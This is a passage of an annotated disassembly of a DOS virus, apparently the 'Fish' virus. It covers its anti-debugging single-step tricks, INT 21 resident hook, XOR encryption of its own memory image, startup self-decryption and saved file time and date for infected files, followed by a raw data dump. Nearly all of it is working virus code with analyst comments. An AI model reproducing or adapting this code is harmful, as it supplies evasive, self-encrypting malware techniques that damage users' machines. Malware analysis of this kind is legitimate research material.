3411:0DC0 5D             POP    BP 
3411:0DC1 2EFF2E350E     JMP    FAR CS:[0E35]
 
3411:0DC6 89

;  SPOOF -- This routine skips over byte following the CALL.

3411:0DC7 E892F3         CALL   015C            ; COD1 - save registers
3411:0DCA B001           MOV    AL,01           ; Interrupt 01H
3411:0DCC BA6B0C         MOV    DX,0C6B 
3411:0DCF 0E             PUSH   CS 
3411:0DD0 1F             POP    DS 
3411:0DD1 E826F4         CALL   01FA            ; CARP2 - set interrupt
3411:0DD4 9C             PUSHF   
3411:0DD5 58             POP    AX 
3411:0DD6 0D0001         OR AX,0100 
3411:0DD9 50             PUSH   AX 
3411:0DDA 9D             POPF    
3411:0DDB 40             INC    AX 
3411:0DDC F7E0           MUL    AX 
3411:0DDE 37             AAA     
3411:0DDF A3310E         MOV    [0E31],AX 
3411:0DE2 E88AF3         CALL   016F            ; COD2 - restore registers
3411:0DE5 C3             RET
 
3411:0DE6 FF

3411:0DE7 55             PUSH   BP
3411:0DE8 89E5           MOV    BP,SP
3411:0DEA 50             PUSH   AX
3411:0DEB 817E0400C0     CMP    Word Ptr [BP+04],C000           ; In ROM?
3411:0DF0 730C           JNB    0DFE 
3411:0DF2 2EA1470E       MOV    AX,CS:[0E47] 
3411:0DF6 394604         CMP    [BP+04],AX 
3411:0DF9 7603           JBE    0DFE 
3411:0DFB 58             POP    AX 
3411:0DFC 5D             POP    BP 
3411:0DFD CF             IRET
3411:0DFE 2E803E500E01   CMP    Byte Ptr CS:[0E50],01
3411:0E04 7426           JZ 0E2C 
3411:0E06 8B4604         MOV    AX,[BP+04] 
3411:0E09 2EA32F0E       MOV    CS:[0E2F],AX 
3411:0E0D 8B4602         MOV    AX,[BP+02] 
3411:0E10 2EA32D0E       MOV    CS:[0E2D],AX 
3411:0E14 720F           JB 0E25 
3411:0E16 58             POP    AX 
3411:0E17 5D             POP    BP 

;  Launch EXE?

3411:0E18 2E8B26DF0E     MOV    SP,CS:[0EDF] 
3411:0E1D 2E8E16DD0E     MOV    SS,CS:[0EDD] 
3411:0E22 E934FF         JMP    0D59
 
3411:0E25 816606FFFE     AND    Word Ptr [BP+06],FEFF 
3411:0E2A EBCF           JMP    0DFB 
3411:0E2C 2EFE0E510E     DEC    Byte Ptr CS:[0E51] 
3411:0E31 75C8           JNZ    0DFB 
3411:0E33 816606FFFE     AND    Word Ptr [BP+06],FEFF 
3411:0E38 E871F3         CALL   01AC            ; SHARK2 - save regs internal
3411:0E3B E81EF3         CALL   015C            ; COD1 - save registers
3411:0E3E B42C           MOV    AH,2C           ; Get system time
3411:0E40 E80EF3         CALL   0151 
3411:0E43 2E8816510D     MOV    CS:[0D51],DL 
3411:0E48 2E88166E0D     MOV    CS:[0D6E],DL 
3411:0E4D 80EC02         SUB    AH,02           ; Get system date, 2A
3411:0E50 E8FEF2         CALL   0151 
3411:0E53 02F2           ADD    DH,DL 
3411:0E55 2E8836840D     MOV    CS:[0D84],DH 
3411:0E5A 2E8836DC0D     MOV    CS:[0DDC],DH 
3411:0E5F B003           MOV    AL,03           ; Breakpoint debug - INT3
3411:0E61 E8ACF3         CALL   0210            ; CARP3 - get interrupt
3411:0E64 06             PUSH   ES 
3411:0E65 1F             POP    DS 
3411:0E66 89DA           MOV    DX,BX 
3411:0E68 B001           MOV    AL,01 
3411:0E6A E88DF3         CALL   01FA            ; CARP2 - set interrupt
3411:0E6D E8FFF2         CALL   016F            ; COD2 - restore registers
3411:0E70 E85FF3         CALL   01D2            ; SHARK3
3411:0E73 E811F3         CALL   0187            ; SHARK1 - rest regs internal

;  Encryption

3411:0E76 53             PUSH   BX 
3411:0E77 51             PUSH   CX 
3411:0E78 BB2800         MOV    BX,0028 
3411:0E7B B98702         MOV    CX,0287 
3411:0E7E 2E80370B       XOR    Byte Ptr CS:[BX],0B 
3411:0E82 83C305         ADD    BX,+05 
3411:0E85 E2F7           LOOP   0E7E 
3411:0E87 59             POP    CX 
3411:0E88 5B             POP    BX 
3411:0E89 EB9A           JMP    0E25 

;  I N T 2 1 / T S R  hook

3411:0E8B 2E800E280000   OR     Byte Ptr CS:[0028],00 
3411:0E91 7413           JZ 0EA6 

;  Memory was encrypted, so decrypt it. Then call our
;  INT 21 TSR, the TROUT2 function. Only every fifth byte is
;  encrypted, to save time.

3411:0E93 53             PUSH   BX 
3411:0E94 51             PUSH   CX 
3411:0E95 BB2800         MOV    BX,0028 
3411:0E98 B98702         MOV    CX,0287 
3411:0E9B 2E80370B       XOR    Byte Ptr CS:[BX],0B 
3411:0E9F 83C305         ADD    BX,+05 
3411:0EA2 E2F7           LOOP   0E9B 
3411:0EA4 59             POP    CX 
3411:0EA5 5B             POP    BX 
3411:0EA6 E9F3F4         JMP    039C            ; TROUT2

;  Encryption (for memory?)

3411:0EA9 51             PUSH   CX 
3411:0EAA 53             PUSH   BX 
3411:0EAB BB2800         MOV    BX,0028 
3411:0EAE B9580D         MOV    CX,0D58 
3411:0EB1 2E80371B       XOR    Byte Ptr CS:[BX],1B 
3411:0EB5 43             INC    BX 
3411:0EB6 E2F9           LOOP   0EB1 
3411:0EB8 5B             POP    BX 
3411:0EB9 59             POP    CX 
3411:0EBA E894F2         CALL   0151 
3411:0EBD EB3F           JMP    0EFE
 
3411:0EBF B82E8F         MOV    AX,8F2E 
3411:0EC2 06             PUSH   ES 
3411:0EC3 41             INC    CX 
3411:0EC4 0E             PUSH   CS 
3411:0EC5 2E8F06430E     POP    CS:[0E43] 
3411:0ECA 2E8F06DB0E     POP    CS:[0EDB] 
3411:0ECF 2E8326DB0EFE   AND    Word Ptr CS:[0EDB],-02 
3411:0ED5 2E803EDA0E00   CMP    Byte Ptr CS:[0EDA],00 
3411:0EDB 7511           JNZ    0EEE 
3411:0EDD 2EFF36DB0E     PUSH   CS:[0EDB] 
3411:0EE2 2EFF1E2D0E     CALL   FAR CS:[0E2D] 
3411:0EE7 7306           JNB    0EEF 
3411:0EE9 2EFE06DA0E     INC    Byte Ptr CS:[0EDA] 
3411:0EEE F9             STC     
3411:0EEF 2EFF2E410E     JMP    FAR CS:[0E41]
 
3411:0EF4 8932           MOV    [BP+SI],SI 
3411:0EF6 C02EC606DA     SHR    Byte Ptr [06C6],DA 
3411:0EFB 0E             PUSH   CS 
3411:0EFC 01CF           ADD    DI,CX

;  Startup decryption of virus.

3411:0EFE E80000         CALL   0F01 
3411:0F01 5B             POP    BX              ; Get our offset
3411:0F02 81EBA90D       SUB    BX,0DA9 
3411:0F06 B9580D         MOV    CX,0D58 
3411:0F09 2E80371B       XOR    Byte Ptr CS:[BX],1B 
3411:0F0D 43             INC    BX 
3411:0F0E E2F9           LOOP   0F09 
3411:0F10 2EFE8FB300     DEC    Byte Ptr CS:[BX+00B3] 
3411:0F15 7403           JZ 0F1A 
3411:0F17 E960F4         JMP    037A            ; TROUT
3411:0F1A C3             RET     

;------------------------------------------------------------------------
                        DB      ' FISH FI'

3411:0F20 4649
3411:0F23 0000
3411:0F25 0000
3411:0F27 00

3411:0F28 00            ; Drive code, 0 = A:, etc.
3411:0F29 3920          ; File time
3411:0F2B BE1C          ; File date

3411:0F2D F8007408      ; DWORD PTR

3411:0F31 0008
3411:0F33 3500

3411:0F35 0001353D      ; DWORD PTR to previous INT21 handler

3411:0F39 0033
3411:0F3B 353146
3411:0F3E 3A30
3411:0F40 34
3411:0F41 33382038      ; DWORD PTR
3411:0F45 30
3411:0F46 46
3411:0F47 43
3411:0F48 3131
3411:0F4A 2020
3411:0F4C 2020
3411:0F4E 2020
3411:0F50 2020
3411:0F52 20434D
3411:0F55 50
3411:0F56 2020
3411:0F58 2020
3411:0F5A 41
3411:0F5B 48
3411:0F5C 2C31
3411:0F5E 3120
3411:0F60 2020
3411:0F62 2020
3411:0F64 2020
3411:0F66 2020
3411:0F68 2020
3411:0F6A 3B20
3411:0F6C 46
3411:0F6D 6972737420
3411:0F72 6D
3411:0F73 61
3411:0F74 7463
3411:0F76 68EB08
3411:0F79 000B
3411:0F7B 350000
3411:0F7E 0435
3411:0F80 2100
3411:0F82 3335
3411:0F84 31463A
3411:0F87 3034
3411:0F89 334220
3411:0F8C 37
3411:0F8D 3430
3411:0F8F 44
3411:0F90 2020
3411:0F92 2020
3411:0F94 2020
3411:0F96 2020
3411:0F98 2020
3411:0F9A 204A5A
3411:0F9D 0930
3411:0F9F 3434
3411:0FA1 41
3411:0FA2 20F8
3411:0FA4 0100
3411:0FA6 8B7600
3411:0FA9 0010
3411:0FAB 350800
3411:0FAE 0835
3411:0FB0 3C00
3411:0FB2 3335
3411:0FB4 31463A
3411:0FB7 3034
3411:0FB9 334420
3411:0FBC 3830
3411:0FBE 46
3411:0FBF 43
3411:0FC0 3132
3411:0FC2 2020
3411:0FC4 2020
3411:0FC6 2020
3411:0FC8 2020
3411:0FCA 20434D
3411:0FCD 50
3411:0FCE 2020
3411:0FD0 2020
3411:0FD2 41
3411:0FD3 48
3411:0FD4 2C31
3411:0FD6 3220
3411:0FD8 2020

3411:0FDA 20
3411:0FDB 2020
3411:0FDD 2020          ; SS save (for EXE)
3411:0FDF 2020          ; SP save (for EXE)

3411:0FE1 20
3411:0FE2 3B20
3411:0FE4 4E
3411:0FE5 65
3411:0FE6 7874
3411:0FE8 206D61
3411:0FEB 7463
3411:0FED 68502B
3411:0FF0 0000
3411:0FF2 1335
3411:0FF4 0800
3411:0FF6 0B35
3411:0FF8 2100
3411:0FFA 3335
3411:0FFC 31463A
3411:0FFF 3034
3411:1001 3430
3411:1003 2037
3411:1005 3430
3411:1007 3820
3411:1009 2020
3411:100B 2020
3411:100D 2020
3411:100F 2020
3411:1011 2020
3411:1013 4A
3411:1014 5A
3411:1015 0930
3411:1017 3434
3411:1019 41

